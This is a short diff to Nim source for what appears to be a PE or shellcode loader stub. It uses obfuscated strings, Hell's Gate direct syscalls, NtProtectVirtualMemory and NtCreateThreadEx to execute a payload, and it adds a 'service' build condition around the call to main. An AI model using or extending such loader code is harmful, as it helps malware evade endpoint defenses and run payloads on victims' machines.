@@ -319,7 +319,6 @@ let PELoadStub * = """
             echo obf("NtProtectVirtualMemory:")
             echo status
 
-        
         when defined(LocalCreateThread):
           when defined(HellsGate):
             if getSyscall(ntCreateTable):
@@ -335,6 +334,7 @@ let PELoadStub * = """
               status = NtCreateThreadEx(&tHandle,THREAD_ALL_ACCESS,nil,-1,retAddr,nil, FALSE, 0, 0, 0, nil)
           when defined(verbose):
             echo obf("[*] NtCreateThreadEx: "), toHex(status)
+
         else:
             let f = cast[proc(){.nimcall.}](retAddr)
             f()
@@ -364,7 +364,9 @@ let PELoadStub * = """
 
 
 when not defined(lib_only):
-    discard main(nil)
+    when not defined(service):
+        discard main(nil)
 when defined(defaultMain):
-    discard main(nil)
+    when not defined(service):
+        discard main(nil)
 """
